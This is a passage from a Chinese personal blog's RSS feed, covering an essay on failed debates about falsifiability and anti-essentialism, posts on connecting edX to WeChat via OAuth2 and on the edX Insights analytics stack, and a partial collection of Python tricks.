&lt;p&gt;同y吃了两顿晚饭，第一次从中医开始，一直聊到科学本身，之后处于鸡同鸭讲的状态（我们没有事先确认一些基本共识）。我误以为可证伪性和科学的范式这些应该是我们共识部分，后来发现y是本质论者，于是我试图解释可证伪性和科学的范式，而我根本没有能力说清这些东西，当时以为表达能力不够，其实是我把自己对它们的认可当做理解了，而一旦付诸表达，就发现自己的理解根本不够透彻。相反y的逻辑极其清晰，我处于一会儿试图反驳，一会儿试图解释我的背景观念，实际上这两方面我都做得极其糟糕，甚至给人以我根本没理解对方的逻辑的感觉。&lt;/p&gt;
&lt;h3&gt;2.2&lt;/h3&gt;
&lt;p&gt;第二次同y吃饭，聊到前段时间在知乎上的一个回答，与《自私的基因》相关的一个话题，期间谈论到逻辑 / 推论和相关性。y质疑在前提本身就是假说的情况下，通过假想实验，再推出非必然性的结论毫无说服力，或者说简直就是错误的典范。其实，我引用的内容和问题的作者，应该是有共同的一些前提假设的，而这些我同y聊的时候，并没有提出，在我的答案里也没有提出，以至于不少评论认为我在没有证明二者相关的情况下，就做推论毫无意义。我的答案只是针对问题作者说的，在我们默认的前提假设下说的，至于大家认为我没有论证的部分，学界尚无定论，我对此兴趣也不大，我所做的是将其作为前提接受，之后用《自私的基因》中的分析方法做推论，我感兴趣的是《自私的基因》中的分析方法本身。&lt;br /&gt;
而这些我都没有交代清楚，之后的谈论其实双方关注点并不一致，y提出的疑问，其实都是很尖锐的问题，逻辑清晰，论证严密，质疑我的论证方法本身的缺陷，而我认为在我的默认背景观念下，是不成问题的，于是我在解释这个问题的同时，还试图辩护这些背景观念，显得左支右绌，如果这时候有第三者在场，一定觉得我连基本的逻辑都不遵循。&lt;/p&gt;
&lt;h3&gt;2.3&lt;/h3&gt;
&lt;p&gt;此外，令人汗颜的是，我什么都想解释导致逻辑混乱的同时，论述方式还很不友好。当发生观念冲突时，我认为y的这些观念是很经典朴素的，并直言其对19世纪之后的科学史缺乏了解。于是我很蛋疼地建议说你应当先读完xxx。 我的意思其实是，对于这些宏大的话题，反本质论，科学的范式，可证伪性，我实在没能力在一顿晚饭中说清，也许因为我不曾深入，所以无法浅出，也许我们这种试图通俗易懂的解释本身就只能造成误解呢，可听起来总归是让人很不舒服的，好像读了两本书，在一知半解的情况下，就有优越感了。我意识到这里之后，急忙道了个歉。&lt;/p&gt;
&lt;p&gt;关于如何通熟易懂解释一个复杂的内容，我想到殷守甫提到的这个例子：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以前有人问我：如何用最少最直的线条画出一个圆？&lt;br /&gt;
我说：这不行啊……直线是直线，圆是圆……&lt;br /&gt;
那人说：这也不行么？你对圆的理解不透彻啊！&lt;br /&gt;
我正要跟他解释，这时又来了一人，他画了一个三角形，然后对一开始来的那个人说：你看，圆就是这样的！我用最可能少的直线画出了一个圆。&lt;br /&gt;
一开始那人恍然大悟：啊，原来这就是圆！我要拜你为师。&lt;br /&gt;
于是我就一个人躲到墙角去了。&lt;br /&gt;
现在，你问我：如何用最通俗易懂的话解释维特根斯坦……&lt;br /&gt;
那啥……我看我还是帮你找那个画了三角形的哥们吧。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上也仅仅是个有趣的例子，我还是相信在一定程度上的深入浅出的解读是可能的，《自私的基因》对进化论的阐释，便做到了通俗和易懂，可作者也真用了不小的篇幅。这与言说者的能力有关，我毫无自信能够简短的语言说清它。&lt;/p&gt;
&lt;h2&gt;3&lt;/h2&gt;
&lt;p&gt;读完《自私的皮球》，作者谈到自己的思想背景时，谈到深刻影响过他的人，看罢，我惊讶得下巴都快脱臼了，对我影响最深的人物都在其中，几乎无一例外。我才知道为何先前读这本书和他的博客的时候，会有那么强烈的冲击和认同。我也想按作者在19章的做法，列出自己的思想背景。&lt;/p&gt;
&lt;p&gt;我最近时常处在无以言说的状态，许多观念，一旦付诸文字，总觉得偏离了所想。而我只要试图表达和交流，就只能付诸语言，无论是口头还是书面。&lt;/p&gt;
&lt;p&gt;我认同维特根斯坦的，对于不可言说的东西，我们只能保持沉默。但我还是乐观地相信，大多东西，只要我提高表达能力还是有可能将其传达给别人的，对于失真率，我却无法确切知道。&lt;/p&gt;
&lt;p&gt;我想以上也是我观念中存在的矛盾之处，理性上，我是赞同维特根斯坦的说法的，可情感上我倾向于去表达和得到理解&lt;/p&gt;
&lt;p&gt;这种表达，对我而言，更重要的也是在内化这些纷杂的观念，有些也许还相互冲突而我不自知呢。&lt;/p&gt;
&lt;p&gt;我毫不奢望通过梳理观念，建立一套自洽无缺陷的体系，我相信他们一定会有缺陷且自相矛盾的地方，但我希望表述出来后，可以更容易观察和思考它，保持它的开放性，接受质疑和讨论，这样一来它就是可成长的了，之后为我看待世界和解释世界时提供更强有力视角和思考框架。&lt;/p&gt;
&lt;p&gt;至于价值观部分，并不打算讨论，我当然也有自己的价值倾向，好比我对有趣和美好的热情远大于实用，无意于为此辩护，喜欢而已 ：）&lt;/p&gt;
&lt;h2&gt;4&lt;/h2&gt;
&lt;p&gt;总结一下，我试图做这样的一些事&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;找出我在看待世界/讨论问题时，基本的出发点。这些基本的观念成为初始假设一般的东西，被我默认接受。基于这些基础观念，我得以做出逻辑推论，或是价值判断&lt;/li&gt;
&lt;li&gt;找出这些观念的来源，与它相关的书籍和人物。当辩论时，如果你对这些基础观念本身有质疑，我们可能需要暂时停下论题，回归到该观念本身，在此需要达成共识再前进。否则，我们的背景假设不同，而因其是我的思考背景，我是默认接受的，在此就发生分歧的话，我也没有能力在论述其他话题时，顺带在短时间内论述清楚它们的，争论容易陷入鸡同鸭讲的状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;5&lt;/h2&gt;
&lt;p&gt;可能涉及的话题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语言/逻辑与概念&lt;/li&gt;
&lt;li&gt;怀疑论&lt;/li&gt;
&lt;li&gt;不可知论&lt;/li&gt;
&lt;li&gt;可证伪性&lt;/li&gt;
&lt;li&gt;科学的范式&lt;/li&gt;
&lt;li&gt;反本质论&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上话题，我没有把握能说好，甚至没有把握能说清楚。无论如何我想把它们表达出来，尽量真实地表达出他们在我的观念中的样子&lt;/p&gt;
&lt;h2&gt;6&lt;/h2&gt;
&lt;p&gt;我接受这些预设的概念和假设，通过它们观察和谈论外部世界，对我而言这些观念本身，至关重要，它们影响到我所能看到的“真实”，也导致必然的偏见，这些观念构成了我所佩戴的有色眼镜。  &lt;/p&gt;
&lt;p&gt;隔在我和“真实”之间。&lt;/p&gt;
&lt;p&gt;我不相信，存在某种本质的“真实”，借助于本能我们也许还可能去感受外部，这里我们已经戴上本能这个“有色眼镜”了。可一旦付诸交流和语言，我们又只能借助于预设的概念和假设去描述这个世界，于是我们又戴上了第二层有色眼镜&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 Jun 2015 00:00:00 +0000</pubDate><guid>tag:,2015-06-01:idea-begin.html</guid><category>idea</category></item><item><title>在微信中使用edX</title><link>/wechat_edx.html</link><description>&lt;p&gt;启用edX的所有API，可能是折腾edX以来遇到的最为艰难的问题之一（另一个是data analytics），前后利用晚上和周末的时间，折腾了好几周。&lt;/p&gt;
&lt;p&gt;困难主要因为文档不全或是没有，甚至有些措辞含糊，几次把我带入歧途，而社区里几乎找不到任何这方面的资料，有人提过此类问题，无一得到解决方案，无论是google group还是github。&lt;/p&gt;
&lt;p&gt;而这一块大家又都很关心（无论是社区还是国内edX开发者），因为edX的开放平台本质上就是开放的API,而edX的安卓和iOS与后端平台的通信，本质也都是基于oauth的API调用。&lt;/p&gt;
&lt;p&gt;上个月末收到一份邮件说，他们近期的工作主要集中在支付宝接口和微信端，问我是否有兴趣同他们协作（我此前有处理过&lt;a href="http://wwj718.github.io/edx-mobile-api.html"&gt;这方面的经验&lt;/a&gt;），他们应该是国内edx方面最具实力的团队之一了吧，我自然是很乐意的。业余时间（晚上和周末）同他们协作。&lt;/p&gt;
&lt;p&gt;暂时为内部项目，也尚有些样式的工作未完成，不方便公开，在此给大家提供大致的方向。&lt;/p&gt;
&lt;h1&gt;just do it&lt;/h1&gt;
&lt;h2&gt;思路&lt;/h2&gt;
&lt;p&gt;我们首先做任务陈述：允许edx用户通过微信公众平台访问edX，登录以及请求相关的数据&lt;/p&gt;
&lt;p&gt;这里假设读者们已经基本了解了&lt;a href="https://tools.ietf.org/html/draft-ietf-oauth-v2-31"&gt;OAuth2&lt;/a&gt;,包括它的一些基本概念和通信流程，如果还不了解，请先阅读OAuth2相关的材料。&lt;/p&gt;
&lt;p&gt;在我们的任务中，我们先识别出OAuth中的参与实体，RO(resource owner)，RS (resource server)和Client，至于AS(authorization server)在edx中和RS可以认为一体。&lt;/p&gt;
&lt;p&gt;很显然我们的任务中，edx平台作为RS，而edx user是RO，而我们自己写的微信公众号后台便是Client。&lt;/p&gt;
&lt;p&gt;由于edX微信后端和edX平台拥有者是相同的，所以我就不采用redirect的方式了。而假设Client是受信任的。&lt;/p&gt;
&lt;p&gt;那么通信的流程是这样的：edx user通过微信公众号中给Client发送账号和密码，而后Client携带用户账号和密码去换取授权令牌(Access Token)，且存下授权令牌，如此一来，概念上，用户在微信中便已经保持登录edX的状态了。&lt;/p&gt;
&lt;p&gt;而后Client根据用户请求，携带Access Token去服务器请求资源返回给微信用户。&lt;/p&gt;
&lt;p&gt;这里不应当混淆的是，&lt;code&gt;使用微信账户登录edx&lt;/code&gt;，和&lt;code&gt;在微信中以edx user身份访问edx&lt;/code&gt;，是两个完全不同的过程，&lt;code&gt;使用微信账户登录edx&lt;/code&gt;本质上是个第三方社交账号登录edx的问题，RS是微信，而&lt;code&gt;edx user在微信中访问edx&lt;/code&gt;，RS是edX。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;ps：当然最后为了使用网页来呈现edX api返回的用户相关数据（美化），我最后把&lt;code&gt;使用微信账户登录edx&lt;/code&gt;也做了。注意：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这不是必须的&lt;/li&gt;
&lt;li&gt;这会造成有两个oauth的问题&lt;/li&gt;
&lt;li&gt;这是为了样式上的美观&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你只用文本或是图文与用户交互，实际上不需要这步&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;好了，思路基本清晰了。&lt;/p&gt;
&lt;h2&gt;先前的经验&lt;/h2&gt;
&lt;p&gt;之前写过一篇博客：&lt;a href="http://wwj718.github.io/edx-mobile-api.html"&gt;让edx为手机端提供接口&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本打算按照之前的经验，却发现，采用TokenAuthentication的解决方案除了侵入性太强，不够优雅之外，安全性也得不到保证&lt;/p&gt;
&lt;p&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-platform-api/en/latest/authentication.html?highlight=secure"&gt;EdX API Authentication&lt;/a&gt;中有一句话，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OAuth 2.0 is an open standard used by many systems that require secure user authentication&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我开始以为，secure只是个建议，稍后我们会发现，这是个强制要求。&lt;/p&gt;
&lt;p&gt;我顺着&lt;a href="http://edx.readthedocs.org/projects/edx-platform-api/en/latest/"&gt;API接口&lt;/a&gt;，从url一路跟踪到view里，看到，所有的api都是基于OAuth2Authentication, SessionAuthentication认证的。虽说使用我前一篇博客提到的TokenAuthentication认证方法，理论上也是可行的，可是却要为每个接口代码注入TokenAuthentication认证方式，很不友好，另一方面，安全性上也不如OAuth2。&lt;/p&gt;
&lt;p&gt;顺带提一下，无论是OAuth2Authentication, SessionAuthentication还是TokenAuthentication，本质都是个认证问题，而认证过程在django中间件里实现，对关注业务逻辑的开发者而言是透明的，而edx的api使用的统一是OAuth2Authentication和SessionAuthentication。&lt;/p&gt;
&lt;p&gt;那么思路基本就清晰了，可选的路线只有一条，绕不过OAuth2.&lt;/p&gt;
&lt;p&gt;在文档跟不上源码，社区反馈寥寥的情况下，阅读源码，根据语义和通常的习惯做法，猜测，实验，验证，基本就是我的摸索方案了&lt;/p&gt;
&lt;h2&gt;接下来你要做的&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;走通OAuth2的流程（安全链接是个强制前提！）&lt;ul&gt;
&lt;li&gt;推荐使用&lt;a href="https://github.com/jakubroztocil/httpie"&gt;httpie&lt;/a&gt;替代curl做实验。而在微信后端的Python脚本中，用来请求API的工具推荐用requests&lt;/li&gt;
&lt;li&gt;福利：如果你走通了edX OAuth2的流程，实际上手机端编译使用的问题也解决了！&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;开启所有API接口，并阅读文档&lt;a href="http://edx.readthedocs.org/projects/edx-platform-api/en/latest/"&gt;EdX Platform APIs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 30 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-30:wechat_edx.html</guid><category>edx</category></item><item><title>edx中数据可视化相关</title><link>/edx-insight.html</link><description>&lt;p&gt;对edX数据这部分关注已久，也耗费了我大量时间。&lt;/p&gt;
&lt;p&gt;五月以来，利用晚上和周末时间，走通了edX oauth2这块的流程，目前edX平台相关的数据理论上可以在微信/手机移动端以及第三方平台使用和呈现。我最近试图通过微信和edX两边的oauth，将两者相连，目前进展还算顺利，不过复杂度比我预期的要高。即将完成edX微信服务号的beta版本。此后会将这部分的思路丢到博客上。&lt;/p&gt;
&lt;p&gt;我本计划在工作的一年期内，理清edX的架构和逻辑/数据流，如今应该还剩下最后一块难啃的骨头，就是可视化数据展示了&lt;/p&gt;
&lt;p&gt;这部分的价值和意义不需多说，数据分析和可视化这也是edX最吸引我的地方之一，其中的行为分析和数据挖掘的潜力，令很多教育从业者青眼有加。&lt;/p&gt;
&lt;p&gt;在此分享这部分我所了解的资料和进展，有兴趣的小伙伴可以在此基础上继续挖掘。如果你对这块也了解的话，可以发email给我：&lt;a href="mailto:wuwenjie718@gmail.com"&gt;wuwenjie718@gmail.com&lt;/a&gt;
，我们一起折腾&lt;/p&gt;
&lt;h1&gt;insights&lt;/h1&gt;
&lt;p&gt;谈到edx中数据可视化，必然提起的是insights。&lt;br /&gt;
我们先来看下insights是什么&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Course teams use edX Insights to access to data gathered from active courses. Course teams use edX Insights to display charts, summary statistics, and data tables......&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;架构&lt;/h1&gt;
&lt;p&gt;&lt;img alt="insight_architecture" src="img/edx/Analytics_Pipeline.png" /&gt;&lt;/p&gt;
&lt;h1&gt;组件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;LMS. LMS产生学生与平台交互时产生的信息，记录到tracking log中，tracking log是此后分析的数据来源，关于tracking log可以参考我的&lt;a href="http://wwj718.github.io/edx-tracking-logs-data-research.html"&gt;这篇文章&lt;/a&gt;.LMS也在MySQL中产生大量学生相关的信息&lt;/li&gt;
&lt;li&gt;edX Analytics Pipeline.这一块就是数据处理的核心所在了。有以下依赖&lt;ul&gt;
&lt;li&gt;Hadoop&lt;/li&gt;
&lt;li&gt;Hive&lt;/li&gt;
&lt;li&gt;Sqoop&lt;/li&gt;
&lt;li&gt;&gt;=MySQL5.6&lt;/li&gt;
&lt;li&gt;Python 2.7&lt;/li&gt;
&lt;li&gt;&gt;=ubuntu12.04&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scheduler  任务调度&lt;/li&gt;
&lt;li&gt;edX Insights  可以将其视为web表现层，向用户呈现分析的结果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;各个组件的协作可在架构图中看出&lt;/p&gt;
&lt;h1&gt;相关的库&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline"&gt;edx-analytics-pipeline&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-data-api"&gt;edx-analytics-data-api&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-dashboard"&gt;edx-analytics-dashboard&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此前有个更早的原型库&lt;a href="https://github.com/edx/insights"&gt;insights&lt;/a&gt;.后来将其功能拆解到以上三个库中&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;综上我们发现，要使这部分可用，最困难的地方来自edx-analytics-pipeline，其依赖了亚马逊的服务，在国内使用很不方便。至于insights这些模块其实在configuration/master中已经是默认安装的（内部端口是8110），要做的不过是做些配置&lt;/p&gt;
&lt;p&gt;目前想到两个方案：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用一台单独的服务器来跑数据分析相关的计算，并保证其能稳定连接亚马逊服务（你懂的）&lt;/li&gt;
&lt;li&gt;使用docker来跑analytics相关的任务，可参考这个分支：&lt;a href="https://github.com/edx/configuration/tree/gabe/analytics-docker"&gt;analytics-docker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;题外：我相信跑在docker上的edX是普及edX（企业级内部培训系统）的方向，edX系统的复杂度，已经影响到其可用性了。作为教育从业者，我想要一个可用的系统。最好是简单稳定的黑盒就好，你特么丢给我一堆零件是什么鬼&lt;/p&gt;
&lt;h1&gt;将analytics跑起来的相关资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline/wiki/Running-the-analytics-backend-locally"&gt;Running the analytics backend locally&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline/wiki/How-Stanford-Online-runs-the-analytics-stack"&gt;How Stanford Online runs the analytics stack
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;edX的其他数据可视化&lt;/h1&gt;
&lt;p&gt;可以看下我此前的&lt;a href="http://wwj718.github.io/edX-Learning-Dashboard-Challenge.html"&gt;这篇文章&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx-installing-configuring-and-running.readthedocs.org/en/latest/analytics/install_analytics.html"&gt;Installing edX Insights&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-analytics-pipeline/wiki"&gt;edx-analytics-pipeline/wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-28:edx-insight.html</guid><category>edx</category></item><item><title>Python tricks</title><link>/python-tricks.html</link><description>&lt;p&gt;前些日子重读《Python Cookbook》，对书中的一些小技巧爱不释手，今天又看到这个&lt;a href="https://github.com/brennerm/PyTricks"&gt;PyTricks&lt;/a&gt;,决定将自己喜欢/常用的一些技巧摘录下来，加入到日常tricks里。&lt;/p&gt;
&lt;h1&gt;exec&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;exec("print('Hello ' + s)", {'s': 'World'})&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;exec can be used to execute Python code during runtime.&lt;br /&gt;
variables can be handed over as a &lt;code&gt;dict&lt;/code&gt;(相当于环境)&lt;/p&gt;
&lt;h1&gt;calculator&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;使用字典搜索来实现 if..else 逻辑&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;operator&lt;/span&gt;
&lt;span class="n"&gt;ops&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;operator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;operator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;operator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;truediv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;operator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mul&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enter an operator [OPTIONS: +, -, *, /]: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enter number: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Enter number: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ops&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;z&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;swicth在python中&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def f(x):
    return {
        &amp;#39;a&amp;#39;: 1,
        &amp;#39;b&amp;#39;: 2,
    }.get(x, 9)
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;conditional function call&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;calling different functions with same arguments based on condition&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;product&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;subtract&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;

&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="n"&gt;subtract&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;dictionary get&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;returning None or default value, when key is not in dict&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;dict sort by value&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Sort a dictionary by its values with the built-in sorted() function and a &amp;#39;key&amp;#39; argument. &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;apple&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;orange&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;banana&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rotten tomato&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;

&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Sort using operator.itemgetter as the sort key instead of a lambda&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

